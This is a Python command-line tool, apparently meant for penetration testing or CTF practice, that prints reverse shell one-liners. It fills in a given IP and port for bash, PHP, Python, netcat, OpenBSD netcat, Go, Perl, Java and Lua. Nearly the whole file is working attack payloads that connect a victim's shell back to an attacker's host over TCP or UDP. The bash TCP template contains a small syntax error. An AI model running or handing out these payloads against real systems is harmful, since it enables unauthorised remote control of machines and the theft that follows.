#!/usr/bin/python3

import sys
import argparse

def banner():
    try:
        with open('banner.txt') as banner:
            print(banner.read())
    except (FileNotFoundError,IOError):
        pass

def msg(name=None):
    if not len(sys.argv) > 1 or "-h" in sys.argv or "--help" in sys.argv:                                                           
        banner()
    
    return '''
        +---------------------------------------------------+
        python3 whatTheshell.py -i 10.10.x.x -p 1337 -l bash
        or
        python3 whatTheshell.py --ip 10.10.x.x --port 1337 --lang bash

Supported shells for:
    [+] bash        [+] bsd
    [+] php         [+] java
    [+] python      [+] lua
    [+] perl
    [+] nc
    [+] go
    '''

def main():
    ip = ''
    port = ''
    lang = ''
    
    parser = argparse.ArgumentParser(add_help=False, usage=msg())
    parser.add_argument('-i', '--ip', type=str, required=False)
    parser.add_argument('-p', '--port', type=int, required=False)
    parser.add_argument('-l', '--lang', type=str, required=False)
    


    parser.add_argument('-v', '--version', action='version',
                    version='%(prog)s 0.1', help="Show version.")
    parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,
                    help='Show options.')
                    
    args = parser.parse_args()
    # if not len(sys.argv) > 1:
    #     banner()
    
    if args.lang == "bash":
        print(f''' Bash reverse shells
            =============================================================================
            TPC reverse shell: bash -c 'bash -i >& /dev/tcp/{args.ip} {args.port} 0>&1'"
            +---------------------------------------------------------------------------+
            UDP reverse shell:  On the victim: sh -i >& /dev/udp/{args.ip}/{args.port} 0>&1
                                On the attacker: nc -u -vlp {args.port}
        ''')

    elif args.lang == "php":
        print(f'''Possible PHP reverse shells
-------------------------------------------------------------------+
            php -r '$sock=fsockopen("{args.ip}",{args.port});exec("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("{args.ip}",{args.port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("{args.ip}",{args.port});`/bin/sh -i <&3 >&3 2>&3`;'
            php -r '$sock=fsockopen("{args.ip}",{args.port});system("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("{args.ip}",{args.port});passthru("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("{args.ip}",{args.port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
        ''')
    
    elif args.lang == "python":
        print(f'''Possible Python reverse shells
---------------------------------------------------+
        IPv4 reverse shells
        -------------------+
            export RHOST="{args.ip}";export RPORT={args.port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
            python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ip}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
        
        IPv6 reverse shells
        -------------------+
            python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",{args.port},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
        ''')

    elif args.lang == "nc":
        print(f'''Netcat Traditional
---------------------------------------------------+
        nc -e /bin/sh {args.ip} {args.port}
        nc -e /bin/bash {args.ip} {args.port}
        nc -c bash {args.ip} {args.port}
        ''')

    elif args.lang == "bsd":
        print(f'''Netcat OpenBsd
---------------------------------------------------+
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.port} >/tmp/f
        ''')
    
    elif args.lang == "go":
        print('''Golang reverse shell | !!! In this shell the IP and port don't get autofilled yet !!!
---------------------------------------------------+
        echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<IP>:<Port>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

        ''')

    elif args.lang == "perl":
        print(f''' Perl Reverse shells:
---------------------------------------------------+
        perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{args.ip}:{args.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

        NOTE: Windows only
        perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{args.ip}:{args.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
        ''')
    elif args.lang == "java":
        print(f'''Java reverse Shells:
---------------------------------------------------+
        Runtime r = Runtime.getRuntime();
        Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{args.ip}/{args.port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
        p.waitFor();
        ''')
    
    elif args.lang == "lua":
        print(f'''lua reverse Shells:
---------------------------------------------------+
  Linux only:
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('{args.ip}','{args.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"

  Windows and Linux:
    lua5.1 -e 'local host, port = "{args.ip}", {args.port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
        ''')


if __name__ == "__main__":
    main()